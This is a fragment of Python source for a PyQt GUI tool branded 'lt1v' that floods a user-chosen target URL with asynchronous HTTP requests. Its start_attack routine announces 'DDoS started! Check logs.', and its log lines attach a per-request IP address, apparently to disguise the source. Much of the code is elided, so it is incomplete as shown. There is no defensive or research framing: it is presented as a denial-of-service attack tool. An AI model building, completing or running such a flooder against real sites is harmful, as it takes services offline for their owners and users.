    ...
    async def send_request(self, session, ip_address):
        ...
        try:
            async with session.get(self.target_url, headers=headers) as response:
                self.log_signal.emit(f"lt1v@root {self.target_url} from IP: {ip_address} - Status: {response.status}")
        except Exception as e:
...
class MainWindow(QMainWindow):
    def __init__(self):
        ...
        image_url = "https://cdn.discordapp.com/avatars/1432647827166859285/493a11f999150929fb2b9384739df0ca.webp?size=1024"
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "lt1v", "Number of requests must be an integer.")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "lt1v", "Please provide a valid URL and number of requests.")
            return
        ...
        QMessageBox.information(self, "lt1v", "DDoS started! Check logs.")
